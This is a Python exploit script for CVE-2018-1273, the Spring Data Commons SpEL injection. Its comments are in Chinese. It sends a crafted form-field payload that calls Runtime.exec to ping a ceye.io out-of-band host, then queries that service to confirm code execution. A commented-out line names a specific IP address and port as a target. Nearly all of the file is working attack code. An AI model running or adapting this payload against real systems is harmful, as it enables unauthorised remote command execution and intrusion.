#coding:utf-8
import sys
import requests
sys.path.insert(0,'..')
from config import random_str
import time
from config import config

def exp_cve_2018_1273(url):
    ceye_dns = config.ceye_dns
    """
    拼接url
    """
    if "://" in url:
        tmp_url = url
        sign = tmp_url.split("//",1)[1]
        if "/" in sign:
            if sign.split("/",1)[1]:
                sign = sign.split("/",1)[1]
                target_url = tmp_url.split(sign,1)[0]
            else:
                target_url = tmp_url
        else:
            target_url = tmp_url + "/"
    else:
        tmp_url = "http://" + url
        sign = tmp_url.split("//", 1)[1]
        if "/" in sign:
            if sign.split("/",1)[1]:
                sign = sign.split("/",1)[1]
                target_url = tmp_url.split(sign,1)[0]
            else:
                target_url = tmp_url
        else:
            target_url = tmp_url + "/"
    #print(target_url)
    target_url = target_url + "users?page=&size=5"   #拼接url
    #print(target_url)
    """
    构造payload
    """
    random_s = random_str.random_str()
    payload = """username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping {0}.vx8u3g.ceye.io")]""".format(random_s)
    data = {
        payload:"",
        "password":"",
        "repeatedPassword":"",
    }
    proxies = config.proxies
    """
    验证漏洞
    """
    try:
        requests.post(target_url,data)
    except:
        print(url + "  不存在CVE-2018-1273漏洞")
        return None
    time.sleep(1)
    response = requests.get(ceye_dns).text
    if random_s in  response:
        print(url + "  存在CVE-2018-1273漏洞")
    else:
        print(url + "  不存在CVE-2018-1273漏洞")


# exp_cve_2018_1273("47.106.8.213:8083/")
